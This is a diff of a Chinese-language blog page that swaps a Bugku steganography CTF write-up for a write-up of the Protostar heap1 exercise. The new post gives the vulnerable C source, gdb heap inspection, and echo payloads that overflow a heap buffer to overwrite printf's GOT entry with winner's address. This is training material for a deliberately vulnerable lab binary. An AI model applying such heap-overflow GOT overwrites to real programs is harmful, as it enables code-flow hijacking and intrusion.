@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="misc," />
+  <meta name="keywords" content="Binary-Hacking," />
 
 
 
@@ -79,30 +79,23 @@
 
 
 
-<meta name="description" content="2018/7/22更新 关于这道题突然想起有几点要补充一下。">
-<meta name="keywords" content="misc">
+<meta name="description" content="进入新一部分的学习，heap(堆) heap1，简单的heap溢出利用。">
+<meta name="keywords" content="Binary-Hacking">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bugku隐写2">
-<meta property="og:url" content="http://yoursite.com/2018/07/18/bugku隐写2/index.html">
+<meta property="og:title" content="Liveoverflow-0x14-heap1">
+<meta property="og:url" content="http://yoursite.com/2018/10/23/Liveoverflow-0x14-heap1/index.html">
 <meta property="og:site_name" content="Muirelle的博客">
-<meta property="og:description" content="2018/7/22更新 关于这道题突然想起有几点要补充一下。">
+<meta property="og:description" content="进入新一部分的学习，heap(堆) heap1，简单的heap溢出利用。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/p67HfEg.jpg">
-<meta property="og:image" content="https://i.imgur.com/IRAkhCb.png">
-<meta property="og:image" content="https://i.imgur.com/aYgS8xg.png">
-<meta property="og:image" content="https://i.imgur.com/5jjI95U.png">
-<meta property="og:image" content="https://i.imgur.com/WQDq44p.png">
-<meta property="og:image" content="https://i.imgur.com/AIzmFWH.png">
-<meta property="og:image" content="https://i.imgur.com/0RJRB32.png">
-<meta property="og:image" content="https://i.imgur.com/bQ1AiWA.png">
-<meta property="og:image" content="https://i.imgur.com/5NmBvgh.png">
-<meta property="og:image" content="https://i.imgur.com/FP9nEmh.png">
-<meta property="og:image" content="https://i.imgur.com/rHNsJKv.png">
-<meta property="og:updated_time" content="2018-10-07T03:05:44.980Z">
+<meta property="og:image" content="https://i.imgur.com/h2s7Xjk.png">
+<meta property="og:image" content="https://i.imgur.com/pjRfei5.png">
+<meta property="og:image" content="https://i.imgur.com/jpXQlP5.png">
+<meta property="og:image" content="https://i.imgur.com/YzLD3o9.png">
+<meta property="og:updated_time" content="2018-10-23T14:33:10.385Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bugku隐写2">
-<meta name="twitter:description" content="2018/7/22更新 关于这道题突然想起有几点要补充一下。">
-<meta name="twitter:image" content="https://i.imgur.com/p67HfEg.jpg">
+<meta name="twitter:title" content="Liveoverflow-0x14-heap1">
+<meta name="twitter:description" content="进入新一部分的学习，heap(堆) heap1，简单的heap溢出利用。">
+<meta name="twitter:image" content="https://i.imgur.com/h2s7Xjk.png">
 
 
 
@@ -132,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/07/18/bugku隐写2/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/23/Liveoverflow-0x14-heap1/"/>
 
 
 
 
 
-  <title>bugku隐写2 | Muirelle的博客</title>
+  <title>Liveoverflow-0x14-heap1 | Muirelle的博客</title>
   
 
 
@@ -265,7 +258,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/18/bugku隐写2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Liveoverflow-0x14-heap1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Muirelle">
@@ -282,7 +275,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">bugku隐写2</h1>
+          <h1 class="post-title" itemprop="name headline">Liveoverflow-0x14-heap1</h1>
         
 
         <div class="post-meta">
@@ -294,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-18T20:24:43+08:00">
-                2018-07-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T18:39:46+08:00">
+                2018-10-23
               </time>
             
 
@@ -304,28 +297,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -354,44 +325,28 @@
       
 
       
-        <hr>
-<p><strong>2018/7/22更新</strong></p>
-<p>关于这道题突然想起有几点要补充一下。</p>
+        <p>进入新一部分的学习，<strong>heap</strong>(堆)</p>
+<p>heap1，简单的heap溢出利用。</p>
 <a id="more"></a>
-<p>首先这道题的解题方法肯定不止一种，直接把图片扔进binwalk里面把包分离出来当然可以秒解。我这种方法算是最笨最没有效率的方法了，可是对于新手来讲要对题目有深刻的理解的话必须要从最繁琐最基本的方法开始做，而且更少不了一遍遍的尝试和失败。对解题的原理有大概清楚的认识之后再用工具就会更加得心应手。</p>
-<p>最后说一下手动找包的几个困难点。</p>
-<p>首先是要找到压缩包的特殊文件标识，这道题是因为用winhex打开然后碰巧看到了zip文件标识PK，加上之前做题的经验推测出内含压缩包的，说实话题还是要多做，不然看到解题需要的某个关键信息（比如文件标识）一点反应也没有的话，又要抱怨：这谁想得到啊？！如果运气不好没有碰巧注意到的话就只有慢慢去找，确实是要把眼睛看花的。不过还是那句话，多练嘛，熟悉之后直接用工具解题就没那么麻烦了。</p>
 <hr>
-<p><a href="http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg" target="_blank" rel="noopener">题目点我</a></p>
-<p>打开链接是一张图片<br><img src="https://i.imgur.com/p67HfEg.jpg" alt=""></p>
-<p>用winhex打开图片，注意到<strong>flag.rar</strong>，猜测图片内含rar压缩包。</p>
-<p><img src="https://i.imgur.com/IRAkhCb.png" alt=""></p>
-<p>又注意到zip压缩包特殊的<strong>头部</strong>和<strong>尾部</strong>标识，所以猜测图片可分解为zip压缩包。</p>
-<p>用notepad++打开图片，查找PK(即zip文件头部或尾部标识)</p>
-<p><img src="https://i.imgur.com/aYgS8xg.png" alt=""></p>
-<p><strong>下面解释一下zip文件的头尾标识</strong></p>
+<h1 id="Protostar-Heap1"><a href="#Protostar-Heap1" class="headerlink" title="Protostar Heap1"></a>Protostar Heap1</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level takes a look at code flow hijacking in data overwrite cases.</strong></p>
+<p><strong>This level is at /opt/protostar/bin/heap1</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">internet</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> priority;</span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">internet</span> *<span class="title">i1</span>, *<span class="title">i2</span>, *<span class="title">i3</span>;</span></span><br><span class="line"></span><br><span class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i1-&gt;priority = <span class="number">1</span>;</span><br><span class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i2-&gt;priority = <span class="number">2</span>;</span><br><span class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <hr>
-<p>(此处新建一个zip文件作为对比↓)</p>
-<p><img src="https://i.imgur.com/5jjI95U.png" alt=""></p>
-<p>头部固定以PK（即50 4B 03 04）作为开始，尾部以PK加上固定长度（一排多两个，即18个hex位）的标识位结束。</p>
-<blockquote>
-</blockquote>
-<p><a href="https://blog.csdn.net/a200710716/article/details/51644421" target="_blank" rel="noopener">关于zip文件格式更详细的介绍</a></p>
-<hr>
-<p>在winhex中找到标识位，删除PK之前的所有内容并保存，将修改后的文件后缀名由jpg改为zip，获得一个zip压缩包。</p>
-<p><img src="https://i.imgur.com/WQDq44p.png" alt=""></p>
-<p>zip压缩包内容如下</p>
-<p><img src="https://i.imgur.com/AIzmFWH.png" alt=""></p>
-<p>下图是<strong>提示.jpg</strong></p>
-<p><img src="https://i.imgur.com/0RJRB32.png" alt=""></p>
-<p>打开flag.rar发现一个已加密的jpg图片，由上图可知密码为三位数字，于是用爆破工具：<strong>ARCHPR</strong></p>
-<p><img src="https://i.imgur.com/bQ1AiWA.png" alt=""></p>
-<p><img src="https://i.imgur.com/5NmBvgh.png" alt=""></p>
-<p>爆破得到密码为<strong>871</strong>，输入后成功打开图片</p>
-<p><img src="https://i.imgur.com/FP9nEmh.png" alt=""></p>
-<p>用notepad++打开图片试试，拖到最后发现flag，括号内猜测为base64加密，解密后得到flag。</p>
-<p><img src="https://i.imgur.com/rHNsJKv.png" alt=""></p>
-<p><strong>flag{y0u Are a h@cker!}</strong></p>
+<p>#分析</p>
+<p>第一次接触堆类型题目肯定要先知道堆是什么，heap和stack都是存放数据的地方，简单来说，stack是系统自动分配变量或者调用函数需要用到的的空间，heap则是你自己开辟的空间(比如用<code>malloc</code>之类的函数开辟空间)，同时也需要手动释放空间(<code>free</code>)，分配方式类似于链表。stack的地址由高向低生长，相反，heap的地址是由低向高生长。</p>
+<p>干说不如实干，进gdb看一眼就明白了。</p>
+<p><img src="https://i.imgur.com/h2s7Xjk.png" alt=""></p>
+<p><img src="https://i.imgur.com/pjRfei5.png" alt=""><br>先找到heap起始地址<strong>0x804a000</strong>，再打印出来，一目了然。和题目源码对照，红框是结构体指针<strong>i1</strong>所指的区域，蓝框就是结构体指针<strong>i2</strong>所指的区域。1和2就是源码对应赋值的1和2。黄框和绿框则分别是<code>malloc(8)</code>新开辟空间的起始地址。</p>
+<p>了解了大概是怎么回事之后再回去看题目，运行<code>winner()</code>就算过关。二话不说，利用strcpy的溢出，实现<strong>write anything anywhere</strong></p>
+<p>#思路</p>
+<p>覆盖掉题中最后一个函数<code>printf</code>的<strong>GOT</strong>表项，改写为winner的地址，实现跳转。</p>
+<p>首先找到printf的GOT和winner地址<br><img src="https://i.imgur.com/jpXQlP5.png" alt=""><br>分别是<strong>0x8049774</strong>(GOT)和<strong>0x8048494</strong>(winner)</p>
+<p>构造第一个参数，使其将第二张图中的绿框位置覆盖为printf的GOT项。构造第二个参数，为winner的地址。</p>
+<pre><code>user@protostar:/tmp$ echo -ne &quot;AAAAAAAAAAAAAAAAAAAA\x74\x97\x04\x08&quot; &gt; heap1A
+user@protostar:/tmp$ echo -ne &quot;\x94\x84\x04\x08&quot; &gt; heap1B
+</code></pre><p><img src="https://i.imgur.com/YzLD3o9.png" alt=""></p>
+<p>成功:p</p>
 
       
     </div>
@@ -409,7 +364,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/misc/" rel="tag"># misc</a>
+            <a href="/tags/Binary-Hacking/" rel="tag"># Binary-Hacking</a>
           
         </div>
       
@@ -422,15 +377,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/10/17/Liveoverflow-0x13-format4/" rel="next" title="Liveoverflow-0x13-format4">
+                <i class="fa fa-chevron-left"></i> Liveoverflow-0x13-format4
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/07/22/kali-Linux虚拟机初始配置/" rel="prev" title="kali Linux虚拟机初始配置">
-                kali Linux虚拟机初始配置 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -482,8 +437,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -543,6 +507,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Protostar-Heap1"><span class="nav-number">1.</span> <span class="nav-text">Protostar Heap1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#About"><span class="nav-number">1.1.</span> <span class="nav-text">About</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
